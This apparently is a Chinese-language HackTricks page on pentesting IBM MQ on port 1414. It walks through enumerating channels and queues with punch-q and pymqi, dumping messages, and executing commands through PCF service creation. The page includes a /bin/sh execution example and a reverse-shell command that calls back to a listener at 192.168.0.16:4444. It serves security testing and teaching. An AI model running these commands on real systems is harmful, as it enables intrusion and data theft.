<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>1414 - Pentesting IBM MQ</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="1414---pentesting-ibm-mq"><a class="header" href="#1414---pentesting-ibm-mq">1414 - Pentesting IBM MQ</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
<p>IBM MQ 是一种 IBM 技术，用于管理消息队列。与其他 <strong>消息中介</strong> 技术一样，它专门用于接收、存储、处理和分类生产者与消费者之间的信息。</p>
<p>默认情况下，<strong>它暴露 IBM MQ TCP 端口 1414</strong>。
有时，HTTP REST API 可以在端口 <strong>9443</strong> 上暴露。
指标（Prometheus）也可以通过 TCP 端口 <strong>9157</strong> 访问。</p>
<p>IBM MQ TCP 端口 1414 可用于操作消息、队列、通道等，但 <strong>也可用于控制实例</strong>。</p>
<p>IBM 提供了大量技术文档，详见 <a href="https://www.ibm.com/docs/en/ibm-mq">https://www.ibm.com/docs/en/ibm-mq</a>。</p>
<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
<p>一个建议的易于利用的工具是 <strong><a href="https://github.com/sensepost/punch-q">punch-q</a></strong>，使用 Docker。该工具积极使用 Python 库 <code>pymqi</code>。</p>
<p>对于更手动的方法，可以使用 Python 库 <strong><a href="https://github.com/dsuch/pymqi">pymqi</a></strong>。需要 <a href="https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&amp;product=ibm/WebSphere/WebSphere+MQ&amp;release=9.0.0.4&amp;platform=All&amp;function=fixId&amp;fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&amp;useReleaseAsTarget=true&amp;includeSupersedes=0&amp;source=fc">IBM MQ 依赖项</a>。</p>
<h3 id="安装-pymqi"><a class="header" href="#安装-pymqi">安装 pymqi</a></h3>
<p><strong>IBM MQ 依赖项</strong> 需要安装和加载：</p>
<ol>
<li>在 <a href="https://login.ibm.com/">https://login.ibm.com/</a> 创建一个帐户 (IBMid)。</li>
<li>从 <a href="https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&amp;product=ibm/WebSphere/WebSphere+MQ&amp;release=9.0.0.4&amp;platform=All&amp;function=fixId&amp;fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&amp;useReleaseAsTarget=true&amp;includeSupersedes=0&amp;source=fc">https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&amp;product=ibm/WebSphere/WebSphere+MQ&amp;release=9.0.0.4&amp;platform=All&amp;function=fixId&amp;fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&amp;useReleaseAsTarget=true&amp;includeSupersedes=0&amp;source=fc</a> 下载 IBM MQ 库。对于 Linux x86_64，它是 <strong>9.0.0.4-IBM-MQC-LinuxX64.tar.gz</strong>。</li>
<li>解压缩 (<code>tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz</code>)。</li>
<li>运行 <code>sudo ./mqlicense.sh</code> 接受许可条款。</li>
</ol>
<blockquote>
<p>如果您使用的是 Kali Linux，请修改文件 <code>mqlicense.sh</code>：删除/注释以下行（第 105-110 行之间）：</p>
<pre><code class="language-bash">if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
 then
   echo "ERROR: This package is incompatible with this system"
   echo "       This package was built for ${BUILD_PLATFORM}"
   exit 1
fi
</code></pre>
</blockquote>
<ol start="5">
<li>安装这些软件包：</li>
</ol>
<pre><code class="language-bash">sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
</code></pre>
<ol start="6">
<li>然后，临时将 <code>.so</code> 文件添加到 LD: <code>export LD_LIBRARY_PATH=/opt/mqm/lib64</code>，<strong>在</strong>使用这些依赖项运行其他工具之前。</li>
</ol>
<p>然后，您可以克隆项目 <a href="https://github.com/dsuch/pymqi"><strong>pymqi</strong></a>：它包含有趣的代码片段、常量等。或者您可以直接安装库：<code>pip install pymqi</code>。</p>
<h3 id="使用-punch-q"><a class="header" href="#使用-punch-q">使用 punch-q</a></h3>
<h4 id="使用-docker"><a class="header" href="#使用-docker">使用 Docker</a></h4>
<p>简单地使用：<code>sudo docker run --rm -ti leonjza/punch-q</code>。</p>
<h4 id="不使用-docker"><a class="header" href="#不使用-docker">不使用 Docker</a></h4>
<p>克隆项目 <a href="https://github.com/sensepost/punch-q"><strong>punch-q</strong></a>，然后按照自述文件进行安装（<code>pip install -r requirements.txt &amp;&amp; python3 setup.py install</code>）。</p>
<p>之后，可以使用 <code>punch-q</code> 命令。</p>
<h2 id="枚举"><a class="header" href="#枚举">枚举</a></h2>
<p>您可以尝试使用 <strong>punch-q</strong> 或 <strong>pymqi</strong> 枚举 <strong>队列管理器名称、用户、通道和队列</strong>。</p>
<h3 id="队列管理器"><a class="header" href="#队列管理器">队列管理器</a></h3>
<p>有时，获取队列管理器名称没有保护：</p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
</code></pre>
<h3 id="channels"><a class="header" href="#channels">Channels</a></h3>
<p><strong>punch-q</strong> 使用一个内部（可修改的）词汇表来查找现有的通道。用法示例：</p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
</code></pre>
<p>有些 IBM MQ 实例接受 <strong>未认证</strong> 的 MQ 请求，因此不需要 <code>--username / --password</code>。当然，访问权限也可能有所不同。</p>
<p>一旦我们获得一个通道名称（这里是：<code>DEV.ADMIN.SVRCONN</code>），我们就可以枚举所有其他通道。</p>
<p>枚举基本上可以使用这个代码片段 <code>code/examples/dis_channels.py</code> 来完成，来自 <strong>pymqi</strong>：</p>
<pre><code class="language-python">import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

</code></pre>
<p>... 但是 <strong>punch-q</strong> 也嵌入了那部分（包含更多信息！）。
可以通过以下方式启动：</p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
</code></pre>
<h3 id="队列"><a class="header" href="#队列">队列</a></h3>
<p>有一个使用 <strong>pymqi</strong> 的代码片段（<code>dis_queues.py</code>），但 <strong>punch-q</strong> 允许检索有关队列的更多信息：</p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
</code></pre>
<h2 id="exploit"><a class="header" href="#exploit">Exploit</a></h2>
<h3 id="dump-messages"><a class="header" href="#dump-messages">Dump messages</a></h3>
<p>您可以针对队列/通道进行嗅探/转储消息（非破坏性操作）。 <em>示例:</em></p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
</code></pre>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
</code></pre>
<p><strong>不要犹豫，迭代所有识别的队列。</strong></p>
<h3 id="代码执行"><a class="header" href="#代码执行">代码执行</a></h3>
<blockquote>
<p>在继续之前的一些细节：IBM MQ 可以通过多种方式进行控制：MQSC、PCF、控制命令。可以在 <a href="https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison">IBM MQ 文档</a> 中找到一些一般列表。
<a href="https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats"><strong>PCF</strong></a> (<em><strong>可编程命令格式</strong></em>) 是我们关注的与实例远程交互的方式。<strong>punch-q</strong> 和进一步的 <strong>pymqi</strong> 基于 PCF 交互。</p>
<p>你可以找到 PCF 命令的列表：</p>
<ul>
<li><a href="https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats">来自 PCF 文档</a>，以及</li>
<li><a href="https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes">来自常量</a>。</li>
</ul>
<p>一个有趣的命令是 <code>MQCMD_CREATE_SERVICE</code>，其文档可在 <a href="https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms">这里</a> 找到。它的参数是指向实例上本地程序的 <code>StartCommand</code>（例如：<code>/bin/sh</code>）。</p>
<p>文档中还有该命令的警告：“注意：此命令允许用户以 mqm 权限运行任意命令。如果被授予使用此命令的权限，恶意或粗心的用户可能会定义一个服务，从而损害您的系统或数据，例如，删除重要文件。”</p>
<p><em>注意：始终根据 IBM MQ 文档（管理参考），在 <code>/admin/action/qmgr/{qmgrName}/mqsc</code> 处还有一个 HTTP 端点，可以运行等效的 MQSC 命令以创建服务（<code>DEFINE SERVICE</code>）。这一方面在这里尚未涵盖。</em></p>
</blockquote>
<p>使用 PCF 进行远程程序执行的服务创建/删除可以通过 <strong>punch-q</strong> 完成：</p>
<p><strong>示例 1</strong></p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
</code></pre>
<blockquote>
<p>在IBM MQ的日志中，您可以看到命令已成功执行：</p>
<pre><code class="language-bash">2023-10-10T19:13:01.713Z AMQ5030I: 命令 '808544aa7fc94c48' 已启动。进程ID(618)。 [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
</code></pre>
</blockquote>
<p>您还可以枚举机器上现有的程序（这里 <code>/bin/doesnotexist</code> ... 不存在）：</p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
</code></pre>
<p><strong>请注意，程序启动是异步的。因此，您需要第二个项目来利用该漏洞</strong> <em><strong>(用于反向 shell 的监听器、在不同服务上创建文件、通过网络进行数据外泄...)</strong></em></p>
<p><strong>示例 2</strong></p>
<p>为了轻松实现反向 shell，<strong>punch-q</strong> 还提供了两个反向 shell 有效载荷：</p>
<ul>
<li>一个使用 bash</li>
<li>一个使用 perl</li>
</ul>
<p><em>当然，您可以使用 <code>execute</code> 命令构建自定义的有效载荷。</em></p>
<p>对于 bash:</p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
</code></pre>
<p>对于perl：</p>
<pre><code class="language-bash">❯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
</code></pre>
<h3 id="custom-pcf"><a class="header" href="#custom-pcf">Custom PCF</a></h3>
<p>您可以深入研究 IBM MQ 文档，并直接使用 <strong>pymqi</strong> python 库来测试 <strong>punch-q</strong> 中未实现的特定 PCF 命令。</p>
<p><strong>Example:</strong></p>
<pre><code class="language-python">import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

</code></pre>
<p>如果您无法找到常量名称，可以参考<a href="https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors">IBM MQ文档</a>。</p>
<blockquote>
<p><em><a href="https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster"><code>MQCMD_REFRESH_CLUSTER</code></a>的示例（十进制 = 73）。它需要参数<code>MQCA_CLUSTER_NAME</code>（十进制 = 2029），可以是<code>*</code>（文档：）：</em></p>
<pre><code class="language-python">import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
    args = {2029: "*"}
    response = pcf.MQCMD_REFRESH_CLUSTER(args)
except pymqi.MQMIError as e:
    print("Error")
else:
    print(response)

qmgr.disconnect()
</code></pre>
</blockquote>
<h2 id="测试环境"><a class="header" href="#测试环境">测试环境</a></h2>
<p>如果您想测试IBM MQ的行为和漏洞，可以基于Docker设置本地环境：</p>
<ol>
<li>在ibm.com和cloud.ibm.com上拥有一个账户。</li>
<li>创建一个容器化的IBM MQ：</li>
</ol>
<pre><code class="language-bash">sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
</code></pre>
<p>默认情况下，身份验证已启用，用户名为 <code>admin</code>，密码为 <code>passw0rd</code>（环境变量 <code>MQ_ADMIN_PASSWORD</code>）。在这里，队列管理器名称已设置为 <code>MYQUEUEMGR</code>（变量 <code>MQ_QMGR_NAME</code>）。</p>
<p>您应该已经启动并运行 IBM MQ，并且其端口已暴露：</p>
<pre><code class="language-bash">❯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414-&gt;1414/tcp, 0.0.0.0:9157-&gt;9157/tcp, 0.0.0.0:9443-&gt;9443/tcp   testing-ibmmq
</code></pre>
<blockquote>
<p>IBM MQ Docker 镜像的旧版本在： https://hub.docker.com/r/ibmcom/mq/.</p>
</blockquote>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec">mgeeky's gist - "实用的 IBM MQ 渗透测试笔记"</a></li>
<li><a href="https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf">MQ 跳跃 - DEFCON 15</a></li>
<li><a href="https://www.ibm.com/docs/en/ibm-mq">IBM MQ 文档</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/1099-pentesting-java-rmi.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/1099-pentesting-java-rmi.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
